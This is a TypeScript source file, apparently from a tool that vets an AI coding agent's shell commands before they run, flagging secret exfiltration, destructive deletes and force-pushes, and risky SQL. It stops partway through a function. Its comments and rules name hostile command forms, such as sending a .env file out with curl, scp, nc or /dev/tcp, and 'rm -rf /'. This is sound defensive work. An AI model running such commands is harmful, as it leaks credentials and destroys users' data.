import { existsSync, readFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, join, posix, resolve } from 'node:path';
import { maskSecrets } from '../../core/mask.ts';
import { isInside, isUpstream, parseArgs, parseShell, stripVersion, type ShellCommand, type ShellDialect, type ShellParse, type ShellWord } from '../../lang/shell.ts';
import type { PackageVerdict } from '../deps/verdict.ts';
import type { ActionVerdict, CommandContext } from './command-types.ts';
import { disabled, protectedPath, readAllowed, readVerdict, resolveUserPath, sensitiveFile, writeAllowed, writeVerdict, type PathCheckContext } from './paths.ts';
import { CURL_VALUE_FLAGS, describeRemoteExec, effectiveArgv, effectiveName, findRemoteExecution, hostOf, isLocalHost, oneLine, urlArgs } from './shell-analysis.ts';

/**
 * Command checks for the hook runtime: they run on a shell command before the
 * agent's shell tool executes it. Each returns an `ask` or `deny` verdict with
 * the rule that produced it; an empty list means the command may run.
 *
 * The checks work on the parsed command (see src/lang/shell.ts), so quoting,
 * chaining, subshells, `bash -c` payloads, and wrappers such as `sudo` and
 * `env` do not hide a command, and a pattern inside a quoted argument (a commit
 * message that mentions `rm -rf /`) is not mistaken for a command.
 */

export interface CommandCheckOptions {
  /** Shell the command runs in. Default: detected (PowerShell cmdlets and syntax), else POSIX sh. */
  shell?: ShellDialect;
}

interface Hit {
  verdict: ActionVerdict;
  /** Simple commands the verdict is about; an allow entry matching any of them drops it. */
  commands: ShellCommand[];
}

export async function checkCommand(command: string, ctx: CommandContext, options: CommandCheckOptions = {}): Promise<ActionVerdict[]> {
  if (!command || !command.trim()) return [];
  const dialect = options.shell ?? (looksLikePowerShell(command) ? 'powershell' : 'sh');
  const parse = parseShell(command, { dialect });
  let run: CommandRun;
  try {
    run = new CommandRun(parse, ctx, command);
  } catch {
    // Analysis failed; the commands.ask and commands.deny entries in ubon.json still apply.
    return applyPolicy([], parse, command, ctx);
  }
  const hits: Hit[] = [];
  const guarded = (rule: string, fn: () => Hit[]) => {
    if (disabled(ctx, rule)) return;
    try {
      hits.push(...fn());
    } catch {
      // A check that fails lets the command through; the hook runtime reports internal errors.
    }
  };
  guarded('agent/secret-exfiltration', () => run.exfiltration());
  guarded('agent/verification-bypass', () => run.verificationBypass());
  guarded('agent/destructive-command', () => run.destructive());
  guarded('agent/remote-script', () => run.remoteScript());
  guarded('agent/publish-or-deploy', () => run.publishOrDeploy());
  guarded('secret/read-sensitive-file', () => run.sensitiveReads());
  guarded('agent/protected-path-write', () => run.protectedWrites());
  if (!disabled(ctx, 'agent/package-install') && ctx.vetPackages) {
    try {
      hits.push(...(await run.packageInstall(ctx.vetPackages)));
    } catch {
      // Registry or vetting failures never block a command.
    }
  }
  return applyPolicy(hits, parse, command, ctx);
}

const PS_HINT = /\b(Invoke-Expression|Invoke-WebRequest|Invoke-RestMethod|Remove-Item|Get-Content|Set-Content|Add-Content|Out-File|New-Object|Get-ChildItem|ForEach-Object|Where-Object|Write-Host|Write-Output|Start-Process|Copy-Item|Move-Item|Select-String)\b|\$env:|(^|[|;]\s*)iex\b/i;

export function looksLikePowerShell(command: string): boolean {
  return PS_HINT.test(command);
}

// ---------------------------------------------------------------------------
// Policy: commands.allow, commands.ask, commands.deny in ubon.json

function normalizeEntry(entry: string): string | null {
  let e = entry.trim();
  const bash = /^(?:Bash|Shell|PowerShell)\((.*)\)$/.exec(e);
  if (bash) e = (bash[1] as string).trim();
  else if (/^(Read|Write|Edit)\(/.test(e)) return null;
  e = e.replace(/:\*$/, '').replace(/\s+\*$/, '').replace(/\*$/, '');
  e = e.replace(/\s+/g, ' ').trim();
  return e || null;
}

function prefixMatch(entry: string, text: string): boolean {
  return text === entry || text.startsWith(`${entry} `) || (entry.endsWith('/') && text.startsWith(entry));
}

function commandTexts(cmd: ShellCommand): string[] {
  const texts = new Set<string>();
  texts.add(cmd.argv.join(' ').replace(/\s+/g, ' ').trim());
  texts.add(effectiveArgv(cmd).join(' ').replace(/\s+/g, ' ').trim());
  texts.add(cmd.text.replace(/\s+/g, ' ').trim());
  return [...texts].filter(Boolean);
}

interface PolicyMatch {
  kind: 'allow' | 'ask' | 'deny';
  entry: string;
}

/** The longest matching entry wins; on equal length deny beats ask beats allow. */
function policyFor(texts: readonly string[], ctx: CommandContext): PolicyMatch | null {
  let best: PolicyMatch | null = null;
  const rank = { deny: 3, ask: 2, allow: 1 } as const;
  for (const kind of ['deny', 'ask', 'allow'] as const) {
    for (const raw of ctx.config?.commands?.[kind] ?? []) {
      const entry = normalizeEntry(raw);
      if (!entry || !texts.some((t) => prefixMatch(entry, t))) continue;
      if (!best || entry.length > best.entry.length || (entry.length === best.entry.length && rank[kind] > rank[best.kind])) best = { kind, entry };
    }
  }
  return best;
}

function applyPolicy(hits: Hit[], parse: ShellParse, command: string, ctx: CommandContext): ActionVerdict[] {
  const whole = command.replace(/\s+/g, ' ').trim();
  const wholePolicy = policyFor([whole], ctx);
  const out: ActionVerdict[] = [];
  const perCommand = new Map<ShellCommand, PolicyMatch | null>();
  const policyOf = (c: ShellCommand) => {
    if (!perCommand.has(c)) perCommand.set(c, policyFor(commandTexts(c), ctx));
    return perCommand.get(c) ?? null;
  };
  if (wholePolicy?.kind === 'allow') return [];
  for (const hit of hits) {
    const allowed = hit.commands.length > 0 && hit.commands.some((c) => policyOf(c)?.kind === 'allow');
    if (!allowed) out.push(hit.verdict);
  }
  // Commands listed in commands.deny or commands.ask extend the destructive-command list.
  const listed = new Map<string, ActionVerdict>();
  const addListed = (p: PolicyMatch, shown: string) => {
    if (p.kind === 'allow' || listed.has(p.entry)) return;
    listed.set(p.entry, {
      rule: 'agent/destructive-command',
      decision: p.kind,
      reason: `\`${shown}\` matches "${p.entry}" in commands.${p.kind} in ubon.json.`,
      fix: p.kind === 'deny' ? 'Do not run this command; ask the user to run it if it is needed.' : 'Confirm with the user before running this command.',
    });
  };
  for (const c of parse.commands) {
    const p = policyOf(c);
    if (p) addListed(p, shorten(c.text));
  }
  if (wholePolicy) addListed(wholePolicy, shorten(command));
  out.push(...listed.values());
  // Deny first, then ask; one verdict per rule and reason.
  const seen = new Set<string>();
  return out
    .filter((v) => {
      const key = `${v.rule}\0${v.decision}\0${v.reason}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    })
    .sort((a, b) => (a.decision === b.decision ? 0 : a.decision === 'deny' ? -1 : 1));
}

function shorten(text: string): string {
  return oneLine(maskSecrets(text), 100);
}

// ---------------------------------------------------------------------------
// The checks

const PROTECTED_BRANCH = /^(main|master|trunk|develop|development|dev|production|prod|staging|stable|release|releases?\/.+|release-.+)$/;

const READERS = new Set(['cat', 'bat', 'batcat', 'less', 'more', 'most', 'head', 'tail', 'nl', 'tac', 'strings', 'od', 'xxd', 'hexdump', 'base64', 'base32', 'sort', 'uniq', 'diff', 'cp', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'awk', 'gawk', 'mawk', 'sed', 'cut', 'jq', 'yq', 'tar', 'zip', 'openssl']);
const PS_READERS = new Set(['cat', 'type', 'get-content', 'gc', 'select-string', 'sls', 'copy-item', 'copy', 'cpi', 'cp']);

function isReader(c: ShellCommand, name: string): boolean {
  return c.dialect === 'powershell' ? PS_READERS.has(name) : READERS.has(name);
}

const ENV_LOADERS = new Set(['export', 'env', 'declare', 'typeset', 'set', 'local', 'readonly', 'eval', 'source', '.']);

const GIT_VALUE_GLOBALS = new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path', '--config-env', '--super-prefix']);

interface GitInvocation {
  sub: string;
  args: string[];
  configs: string[];
  dir: string | null;
}

function gitInvocation(cmd: ShellCommand): GitInvocation | null {
  const argv = effectiveArgv(cmd);
  if (effectiveName(cmd) !== 'git') return null;
  const configs: string[] = [];
  let dir: string | null = null;
  let i = 1;
  while (i < argv.length) {
    const a = argv[i] as string;
    if (!a.startsWith('-')) break;
    if (GIT_VALUE_GLOBALS.has(a)) {
      if (a === '-c') configs.push(argv[i + 1] ?? '');
      if (a === '-C') dir = argv[i + 1] ?? null;
      i += 2;
      continue;
    }
    if (a.startsWith('--config-env=')) configs.push(a.slice('--config-env='.length));
    i++;
  }
  const sub = argv[i];
  if (!sub) return null;
  return { sub, args: argv.slice(i + 1), configs, dir };
}

/** A shell variable set earlier on the same command line. */
type VarValue = { kind: 'literal'; value: string } | { kind: 'temp' } | { kind: 'unknown' };

const VAR_REF = /\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)/g;
const MKTEMP = /^(?:\$\(\s*mktemp\b[^)]*\)|`\s*mktemp\b[^`]*`)$/;

class CommandRun {
  private readonly parse: ShellParse;
  private readonly ctx: CommandContext;
  private readonly pathCtx: PathCheckContext;
  private readonly home: string;
  private readonly source: string;
  /** Directory each command runs in (after `cd`), or null when it cannot be known. */
  private readonly cwdOf = new Map<ShellCommand, string | null>();
  /** Variables each command sees from assignments earlier on the line (`D=$(mktemp -d) && rm -rf $D`). */
  private readonly varsOf = new Map<ShellCommand, ReadonlyMap<string, VarValue>>();

  constructor(parse: ShellParse, ctx: CommandContext, source: string) {
    this.parse = parse;
    this.ctx = ctx;
    this.home = homedir();
    this.pathCtx = { cwd: ctx.cwd, root: ctx.root, config: ctx.config, home: this.home };
    this.source = source;
    let cwd: string | null = ctx.cwd;
    let vars = new Map<string, VarValue>();
    for (const c of parse.commands) {
      this.cwdOf.set(c, cwd);
      this.varsOf.set(c, vars);
      const assigned = this.assignmentsOf(c, vars);
      if (assigned.length > 0) {
        vars = new Map(vars);
        for (const [n, v] of assigned) vars.set(n, v);
      }
      const name = c.name;
      if ((name === 'cd' || name === 'pushd' || name === 'set-location' || name === 'sl' || name === 'chdir') && c.origin !== 'substitution') {
        const target = c.words.slice(1).find((w) => !w.value.startsWith('-'));
        // `cd $D` after D=... on the same line: use the value; a mktemp directory is outside the project.
        const known = target && target.expansions.length > 0 && !/^\$\{?HOME\}?/.test(target.value) ? this.expand(target.value, c) : (target?.value ?? null);
        if (!target) cwd = this.home;
        else if (known === null) cwd = join(tmpdir(), 'ubon-mktemp');
        else if (known.includes('$') || known.includes('`')) cwd = null;
        else if (known === '-') cwd = null;
        else if (cwd !== null || known.startsWith('/') || known.startsWith('~')) cwd = resolveUserPath(known, { ...this.pathCtx, cwd: cwd ?? ctx.cwd }).abs;
      }
    }
  }

  private cwd(c: ShellCommand): string | null {
    return this.cwdOf.has(c) ? (this.cwdOf.get(c) ?? null) : this.ctx.cwd;
  }

  /** Variables a command sets for the commands after it: `D=x`, `export D=x`, `unset D`. */
  private assignmentsOf(c: ShellCommand, vars: ReadonlyMap<string, VarValue>): Array<[string, VarValue]> {
    // Assignments inside substitutions do not reach the rest of the line.
    if (c.origin === 'substitution' || c.origin === 'process-substitution' || c.dialect !== 'sh') return [];
    if (c.argv.length === 0) return c.assignments.map((a) => [a.name, this.valueOf(a.value, vars)]);
    const out: Array<[string, VarValue]> = [];
    if (['export', 'readonly', 'declare', 'typeset', 'local'].includes(c.name)) {
      for (const arg of c.argv.slice(1)) {
        const m = /^([A-Za-z_]\w*)=(.*)$/s.exec(arg);
        if (m) out.push([m[1] as string, this.valueOf(m[2] as string, vars)]);
      }
    } else if (c.name === 'unset') {
      for (const arg of c.argv.slice(1)) if (/^[A-Za-z_]\w*$/.test(arg)) out.push([arg, { kind: 'literal', value: '' }]);
    }
    return out;
  }

  private valueOf(value: string, vars: ReadonlyMap<string, VarValue>): VarValue {
    if (MKTEMP.test(value.trim())) return { kind: 'temp' };
    const lead = /^\$\{?([A-Za-z_]\w*)\}?/.exec(value);
    if (lead && vars.get(lead[1] as string)?.kind === 'temp') return { kind: 'temp' };
    const expanded = value.replace(VAR_REF, (m, a?: string, b?: string) => {
      const name = (a ?? b) as string;
      const v = vars.get(name);
      if (v?.kind === 'literal') return v.value;
      if (name === 'HOME' && !vars.has('HOME')) return this.home;
      return m;
    });
    return expanded.includes('$') || expanded.includes('`') ? { kind: 'unknown' } : { kind: 'literal', value: expanded };
  }

  /**
   * A path as written, with variables set earlier on the line filled in.
   * Null when it is inside a directory made by mktemp (outside the project).
   */
  private expand(text: string, c: ShellCommand): string | null {
    const vars = this.varsOf.get(c);
    if (!vars || vars.size === 0 || !text.includes('$')) return text;
    const lead = /^\$\{?([A-Za-z_]\w*)\}?/.exec(text);
    if (lead && vars.get(lead[1] as string)?.kind === 'temp') return null;
    return text.replace(VAR_REF, (m, a?: string, b?: string) => {
      const v = vars.get((a ?? b) as string);
      return v?.kind === 'literal' ? v.value : m;
    });
  }

  private shown(c: ShellCommand): string {
    return shorten(c.text || c.argv.join(' '));
  }

  private hit(rule: string, decision: 'ask' | 'deny', reason: string, fix: string, commands: ShellCommand[]): Hit {
    return { verdict: { rule, decision, reason, fix }, commands };
  }

  // -------------------------------------------------------------------------
  // agent/destructive-command

  destructive(): Hit[] {
    const out: Hit[] = [];
    const rule = 'agent/destructive-command';
    const ask = (c: ShellCommand, reason: string, fix: string) => out.push(this.hit(rule, 'ask', reason, fix, [c]));
    for (const c of this.parse.commands) {
      const name = effectiveName(c);
      const argv = effectiveArgv(c);
      const args = argv.slice(1);
      // rm -r, rimraf
      if ((name === 'rm' || name === 'rimraf') && c.dialect === 'sh') {
        const p = parseArgs(args, 0);
        const recursive = name === 'rimraf' || p.flags.has('r') || p.flags.has('R') || p.flags.has('recursive');
        if (p.flags.has('no-preserve-root')) {
          ask(c, `\`${this.shown(c)}\` turns off rm's protection for the root directory.`, 'Delete specific paths inside the project instead.');
          continue;
        }
        if (!recursive) continue;
        const words = c.words.slice(c.argv.length - argv.length + 1);
        const operandWords = p.operandIndexes.map((i) => words[i]).filter((w): w is ShellWord => w !== undefined);
        const danger = operandWords.map((w) => this.deleteTargetDanger(w, c)).find(Boolean);
        if (danger) ask(c, `\`${this.shown(c)}\` deletes ${danger}.`, 'Delete specific paths inside the project instead; if this is intended, ask the user to run it.');
        continue;
      }
      // PowerShell Remove-Item -Recurse
      if (c.dialect === 'powershell' && ['remove-item', 'rm', 'ri', 'del', 'erase', 'rd', 'rmdir'].includes(name)) {
        const recurse = args.some((a) => /^-r(e|ec|ecu|ecur|ecurs|ecurse)?$/i.test(a));
        if (!recurse) continue;
        const operands = psOperands(c.words.slice(1), new Set(['-path', '-literalpath', '-lp', '-filter', '-include', '-exclude', '-credential', '-stream']));
        const danger = operands.map((w) => this.deleteTargetDanger(w, c)).find(Boolean);
        if (danger) ask(c, `\`${this.shown(c)}\` deletes ${danger}.`, 'Delete specific paths inside the project instead; if this is intended, ask the user to run it.');
        continue;
      }
      if (c.dialect === 'powershell' && ['format-volume', 'clear-disk', 'initialize-disk'].includes(name)) {
        ask(c, `\`${this.shown(c)}\` erases a disk.`, 'Ask the user to run disk operations themselves.');
        continue;
      }
      // find ... -delete / -exec rm
      if (name === 'find') {
        const danger = this.findDanger(c, args);
        if (danger) ask(c, `\`${this.shown(c)}\` deletes ${danger}.`, 'Limit the search to a directory inside the project and to specific names.');
        continue;
      }
      const git = gitInvocation(c);
      if (git) {
        const reason = this.gitDanger(c, git);
        if (reason) ask(c, reason.reason, reason.fix);
        continue;
      }
      const sql = this.sqlDanger(c, name, args);
      if (sql) {
        ask(c, `\`${this.shown(c)}\` runs ${sql}, which deletes data.`, 'Show the statement to the user first, and add a WHERE clause or use a migration for schema changes.');
        continue;
      }
      const tool = toolDanger(name, args, c);
      if (tool) {
        ask(c, `\`${this.shown(c)}\` ${tool.what}.`, tool.fix);
        continue;
      }
      // > /dev/sda
      for (const r of c.redirects) {
        if (/^(>|>>|>\||&>)$/.test(r.op) && r.target && isDiskDevice(r.target.value)) {
          ask(c, `\`${this.shown(c)}\` writes directly to the disk device ${r.target.value}.`, 'Ask the user to run disk operations themselves.');
          break;
        }
      }
    }
    return out;
  }

  /** What deleting this path destroys, or null when it is an ordinary path. */
  private deleteTargetDanger(word: ShellWord, c: ShellCommand): string | null {
    const value = word.value;
    // Variables set earlier on the line: `D=$(mktemp -d) && ... && rm -rf $D`, `OUT=/tmp/x; rm -rf $OUT`.
    if (word.expansions.length > 0 && word.expansions.every((e) => e.kind === 'var')) {
      const expanded = this.expand(value, c);
      if (expanded === null) return null;
      if (expanded !== value && !expanded.includes('$')) {
        // An empty unquoted value leaves rm without that operand.
        if (expanded === '') return null;
        return this.deleteTargetDanger({ raw: expanded, value: expanded, quoted: false, expansions: [], glob: /[*?[]/.test(expanded), ansiC: false }, c);
      }
    }
    const lead = word.expansions.find((e) => e.at === 0);
    if (lead?.kind === 'var') {
      const rest = value.slice(lead.text.length);
      if (lead.name === 'HOME' || lead.name === 'USERPROFILE' || /^\$env:USERPROFILE$/i.test(lead.text)) {
        if (/^\/?\*?$|^\/\.\*$/.test(rest)) return 'your home directory';
        return null;
      }
      if (/^\$\{[^}]*:[?-]/.test(lead.text)) return null; // ${X:?} fails when unset; ${X:-default} has a fallback
      if (/^\$\{?(PWD|OLDPWD|TMPDIR|CLAUDE_PROJECT_DIR|GEMINI_PROJECT_DIR|CURSOR_PROJECT_DIR)\}?$/.test(lead.text) && rest.length > 1) return null;
      if (!lead.quoted && c.dialect === 'sh') {
        if (/^\/\*?$/.test(rest)) return `the path in the unquoted variable ${lead.text} (the root directory if it is empty)`;
        if (rest === '') return `the path in the unquoted variable ${lead.text} (other paths if its value has spaces or wildcards)`;
        if (rest.startsWith('/')) return null;
        return null;
      }
      if (/^\/\*?$/.test(rest)) return `${lead.text}${rest}, which is the root directory when ${lead.text} is empty`;
      return null;
    }
    if (lead?.kind === 'command') return null;
    if (word.expansions.length > 0 && !value.startsWith('~') && !value.startsWith('/')) return null;
    const quotedTilde = /^['"]~/.test(word.raw);
    if (!quotedTilde && /^~\/?(\*|\.\*)?$/.test(value)) return 'your home directory';
    if (c.dialect === 'powershell') {
      if (/^([A-Za-z]:)?[\\/]\*?$/.test(value)) return 'the root of a drive';
      if (/^[A-Za-z]:[\\/][^\\/]+[\\/]?$/.test(value) && !/^[A-Za-z]:[\\/](tmp|temp)[\\/]?$/i.test(value)) return `the top-level directory ${value}`;
    }
    const cwd = this.cwd(c);
    if (value.startsWith('/')) {
      const norm = posix.normalize(value.replace(/\/\*$/, '/')).replace(/\/+$/, '') || '/';
      const depth = norm === '/' ? 0 : norm.split('/').length - 1;
      if (depth === 0) return 'the root directory';
      if (depth === 1) return `the top-level directory ${norm}`;
      const home = this.home.replace(/\\/g, '/');
      if (norm === home) return 'your home directory';
      const root = this.ctx.root.replace(/\\/g, '/');
      if (norm === root) return 'the whole project';
      if (root.startsWith(`${norm}/`)) return `${norm}, which contains the project`;
      return null;
    }
    if (/^(\.\.\/?)+(\*|\.\*)?$/.test(value)) return `${value}, which contains the project directory`;
    if (cwd === null && !value.startsWith('~')) return null;
    const base = cwd ?? this.ctx.cwd;
    const stripped = value.replace(/\/(\*|\.\*)$/, '').replace(/^\.\/+/, './');
    const everything = /^(\*|\.\*|\.\/?\*?|\.\/\.\*)$/.test(value);
    const abs = everything ? base : resolveUserPath(stripped || '.', { ...this.pathCtx, cwd: base }).abs;
    const root = resolve(this.ctx.root);
    if (everything || /\/(\*|\.\*)$/.test(value)) {
      if (abs === root) return 'every file in the project';
      if (root.startsWith(`${abs}/`)) return `every file in ${abs}, which contains the project`;
      if (abs === this.home) return 'everything in your home directory';
    }
    if (abs === join(root, '.git')) return "the project's .git directory and its history";
    if (abs === root) return 'the whole project';
    return null;
  }

  private findDanger(c: ShellCommand, args: string[]): string | null {
    const deletes = args.includes('-delete') || this.parse.commands.some((x) => x.parent === c && x.origin === 'exec' && (x.name === 'rm' || x.name === 'rimraf'));
    if (!deletes) return null;
    const starts: ShellWord[] = [];
    for (let i = 1; i < c.words.length; i++) {
      const w = c.words[i] as ShellWord;
      if (/^[-(!]/.test(w.value)) break;
      starts.push(w);
    }
    if (starts.length === 0) starts.push({ raw: '.', value: '.', quoted: false, expansions: [], glob: false, ansiC: false });
    const filtered = args.some((a) => /^-(i?name|i?path|i?wholename|i?regex|type|mtime|mmin|atime|ctime|newer|size|empty|user|group|perm|links|inum|samefile|maxdepth)$/.test(a));
    for (const w of starts) {
      const danger = this.deleteTargetDanger({ ...w, value: w.value === '.' || w.value === './' ? '*' : w.value }, c);
      if (!danger) continue;
      if (filtered && !/root directory|home directory|top-level/.test(danger)) continue;
      return filtered ? `matching files anywhere under ${w.value}` : danger;
    }
    return null;
  }

  private gitDanger(c: ShellCommand, git: GitInvocation): { reason: string; fix: string } | null {
    const shown = this.shown(c);
    const { sub, args } = git;
    if (sub === 'push') {
      const p = parseArgs(args, 0, new Set(['o', 'push-option', 'repo', 'receive-pack', 'exec']));
      if (p.flags.has('n') || p.flags.has('dry-run')) return null;
      if (p.flags.has('mirror')) return { reason: `\`${shown}\` makes the remote an exact copy of this repository, overwriting and deleting its branches.`, fix: 'Push the branches you changed by name instead.' };
      const force = p.flags.has('f') || p.flags.has('force');
      const lease = [...p.flags].some((f) => f === 'force-with-lease' || f === 'force-if-includes');
      const del = p.flags.has('d') || p.flags.has('delete');
      const refspecs = p.operands.slice(1);
      const targets: Array<{ branch: string; forced: boolean; deleted: boolean }> = [];
      for (const spec of refspecs) {
        const forced = spec.startsWith('+');
        const s = forced ? spec.slice(1) : spec;
        const colon = s.indexOf(':');
        const src = colon === -1 ? s : s.slice(0, colon);
        let dst = colon === -1 ? s : s.slice(colon + 1);
        if (dst === 'HEAD' || (colon === -1 && src === 'HEAD')) dst = this.ctx.currentBranch() ?? '';
        dst = dst.replace(/^refs\/heads\//, '');
        targets.push({ branch: dst, forced, deleted: del || (colon !== -1 && src === '') });
      }
      if (refspecs.length === 0 && !p.flags.has('all') && !p.flags.has('branches') && !p.flags.has('tags')) {
        const current = force || lease || del ? this.ctx.currentBranch() : null;
        if (current) targets.push({ branch: current, forced: false, deleted: false });
      }
      if ((force || lease) && (p.flags.has('all') || p.flags.has('branches'))) {
        return { reason: `\`${shown}\` force-pushes every branch, including protected ones such as main.`, fix: 'Force-push only the feature branch you rewrote.' };
      }
      for (const t of targets) {
        if (!PROTECTED_BRANCH.test(t.branch)) continue;
        if (t.deleted) return { reason: `\`${shown}\` deletes the protected branch ${t.branch} on the remote.`, fix: 'Leave protected branches in place; ask the user if the branch should really go.' };
        if (force || t.forced) return { reason: `\`${shown}\` force-pushes to the protected branch ${t.branch}, which rewrites its shared history.`, fix: 'Push without --force, or rewrite history only on a feature branch and open a pull request.' };
        if (lease) return { reason: `\`${shown}\` force-pushes (with lease) to the protected branch ${t.branch}, which rewrites its shared history.`, fix: 'Rewrite history only on a feature branch and open a pull request.' };
      }
      return null;
    }
    if (sub === 'reset') {
      if (!args.includes('--hard')) return null;
      if (!this.ctx.hasUncommittedChanges()) return null;
      return { reason: `\`${shown}\` discards the uncommitted changes in the working tree.`, fix: 'Commit or stash the changes first (git stash push -u), or reset only the files you mean to.' };
    }
    if (sub === 'clean') {
      const p = parseArgs(args, 0, new Set(['e', 'exclude']));
      const force = p.flags.has('f') || p.flags.has('force');
      if (!force || p.flags.has('n') || p.flags.has('dry-run') || p.flags.has('i') || p.flags.has('interactive')) return null;
      if (!this.ctx.hasUncommittedChanges()) return null;
      return { reason: `\`${shown}\` deletes untracked files${p.flags.has('x') || p.flags.has('X') ? ', including ignored ones such as .env files,' : ''} that git cannot restore.`, fix: 'Run it with -n first to list what it would delete, and remove only those files.' };
    }
    if (sub === 'checkout' || sub === 'restore' || sub === 'switch') {
      const p = parseArgs(args, 0, new Set(['s', 'source', 'b', 'B', 'c', 'C', 'orphan', 'conflict', 'pathspec-from-file']));
      const whole = p.operands.some((o) => o === '.' || o === ':/' || o === ':' || o === '*');
      const force = p.flags.has('f') || p.flags.has('force') || p.flags.has('discard-changes');
      const stagedOnly = sub === 'restore' && (p.flags.has('staged') || p.flags.has('S')) && !(p.flags.has('worktree') || p.flags.has('W'));
      if (stagedOnly) return null;
      if (!whole && !force) return null;
      if (!this.ctx.hasUncommittedChanges()) return null;
      return { reason: `\`${shown}\` overwrites the uncommitted changes in the working tree.`, fix: 'Commit or stash the changes first, or restore only the files you mean to.' };
    }
    if (sub === 'branch') {
      const p = parseArgs(args, 0);
      const forceDelete = p.flags.has('D') || ((p.flags.has('d') || p.flags.has('delete')) && (p.flags.has('f') || p.flags.has('force')));
      if (!forceDelete || p.operands.length === 0) return null;
      return { reason: `\`${shown}\` deletes ${p.operands.join(', ')} even if it has commits that are not merged anywhere.`, fix: 'Use git branch -d, which refuses to delete unmerged work, or ask the user.' };
    }
    return null;
  }

  private sqlDanger(c: ShellCommand, name: string, args: string[]): string | null {
    const sources: string[] = [];
    const valueOf = (flags: string[]) => {
      for (let i = 0; i < args.length; i++) {
        const a = args[i] as string;
        for (const f of flags) {
          if (a === f && args[i + 1] !== undefined) sources.push(args[i + 1] as string);
          else if (f.startsWith('--') && a.startsWith(`${f}=`)) sources.push(a.slice(f.length + 1));
          else if (!f.startsWith('--') && a.startsWith(f) && a.length > f.length && f.length === 2) sources.push(a.slice(2));
        }
      }
    };
    let isDbClient = true;
    switch (name) {
      case 'psql':
        valueOf(['-c', '--command']);
        break;
      case 'mysql':
      case 'mariadb':
        valueOf(['-e', '--execute']);
        break;
      case 'cockroach':
        if (args[0] !== 'sql') return null;
        valueOf(['-e', '--execute']);
        break;
      case 'sqlite3':
      case 'sqlite':
      case 'duckdb': {
        valueOf(['-cmd']);
        const p = parseArgs(args, 0, new Set(['cmd', 'separator', 'newline', 'nullvalue', 'init']));
        sources.push(...p.operands.slice(1));
        break;
      }
      case 'clickhouse-client':
      case 'clickhouse':
        valueOf(['-q', '--query']);
        break;
      case 'sqlcmd':
        valueOf(['-Q', '-q']);
        break;
      case 'turso':
        if (args[0] === 'db' && args[1] === 'shell') sources.push(...args.slice(3));
        break;
      case 'wrangler':
        if (args[0] === 'd1' && args[1] === 'execute') valueOf(['--command']);
        break;
      case 'redis-cli': {
        if (args.some((a) => /^flush(all|db)$/i.test(a))) return 'FLUSHALL or FLUSHDB';
        isDbClient = false;
        break;
      }
      case 'mongosh':
      case 'mongo': {
        const code: string[] = [];
        for (let i = 0; i < args.length; i++) if (args[i] === '--eval') code.push(args[i + 1] ?? '');
        if (code.some((js) => /\.dropDatabase\s*\(|\.drop\s*\(\s*\)|\.(deleteMany|remove)\s*\(\s*\{\s*\}\s*\)/.test(js))) return 'a MongoDB drop or delete-all';
        isDbClient = false;
        break;
      }
      default:
        isDbClient = false;
    }
    if (!isDbClient) return null;
    // SQL on stdin: here-documents, here-strings, and `echo ... |`.
    for (const r of c.redirects) {
      if (r.body !== undefined) sources.push(r.body);
      if (r.op === '<<<' && r.target) sources.push(r.target.value);
    }
    for (const up of this.parse.commands) {
      if (up === c || !isUpstream(up, c)) continue;
      if (up.name === 'echo' || up.name === 'printf') sources.push(up.argv.slice(1).join(' '));
      for (const r of up.redirects) if (r.body !== undefined) sources.push(r.body);
    }
    for (const sql of sources) {
      const found = destructiveSql(sql);
      if (found) return found;
    }
    return null;
  }

  // -------------------------------------------------------------------------
  // agent/secret-exfiltration

  exfiltration(): Hit[] {
    const out: Hit[] = [];
    const commands = this.parse.commands;
    const sources = commands.map((c) => ({ c, what: this.secretSource(c) })).filter((s): s is { c: ShellCommand; what: string } => s.what !== null);
    for (const n of commands) {
      const sink = this.networkSink(n);
      if (!sink) continue;
      let found: { what: string; from: ShellCommand | null } | null = null;
      // 1. The sender reads a secret file itself (curl -F f=@.env, scp .env host:, nc host < .env).
      const own = this.senderFiles(n);
      for (const f of own) {
        const s = sensitiveFile(f, this.pathCtxFor(n), { peek: true });
        if (s) {
          found = { what: s.what, from: null };
          break;
        }
      }
      // 2. The command reads a secret and writes it to a network socket (cat .env > /dev/tcp/host/80).
      if (!found && sink.selfOutput) {
        const what = this.secretSource(n);
        if (what) found = { what, from: null };
      }
      // 3. A secret flows through the pipeline into the sender's stdin.
      if (!found && sink.readsStdin) {
        const up = sources.find((s) => isUpstream(s.c, n));
        if (up) found = { what: up.what, from: up.c };
      }
      // 4. A substitution in the sender's arguments reads a secret (not in a header, which is how keys authenticate).
      if (!found) {
        const inner = sources.find((s) => isInside(s.c, n) && s.c.parentWord !== null && !this.isHeaderArgument(n, s.c));
        if (inner) found = { what: inner.what, from: inner.c };
      }
      if (!found) continue;
      const piped = found.from !== null && isUpstream(found.from, n);
      const shown = piped && found.from ? `${this.shown(found.from)} | ${this.shown(n)}` : this.shown(n);
      const via = found.from && !piped ? ` (read by \`${this.shown(found.from)}\`)` : '';
      out.push(
        this.hit(
          'agent/secret-exfiltration',
          'deny',
          `\`${shown}\` sends ${found.what}${via} to ${sink.where}.`,
          'Do not send secrets over the network; if a service needs a key, the user should configure it there.',
          found.from ? [n, found.from] : [n],
        ),
      );
    }
    return out;
  }

  private pathCtxFor(c: ShellCommand): PathCheckContext {
    const cwd = this.cwd(c);
    return cwd ? { ...this.pathCtx, cwd } : this.pathCtx;
  }

  /** What secret a command outputs, or null. */
  private secretSource(c: ShellCommand): string | null {
    const name = effectiveName(c);
    const argv = effectiveArgv(c);
    const args = argv.slice(1);
    if (name === 'printenv' || (name === 'env' && args.length === 0) || (name === 'set' && args.length === 0 && c.dialect === 'sh')) return 'the environment variables';
    if ((name === 'export' || name === 'declare' || name === 'typeset') && args.some((a) => a === '-p' || a === '-x' || a === '-px')) return 'the environment variables';
    if (c.dialect === 'powershell' && ['get-childitem', 'gci', 'dir', 'ls'].includes(name) && args.some((a) => /^env:\\?$/i.test(a))) return 'the environment variables';
    if (name === 'gh' && args[0] === 'auth' && (args[1] === 'token' || args.includes('--show-token') || args.includes('-t'))) return 'the GitHub CLI token';
    if (name === 'aws' && args[0] === 'configure' && (args[1] === 'export-credentials' || (args[1] === 'get' && /secret|key|token/i.test(args[2] ?? '')))) return 'AWS credentials';
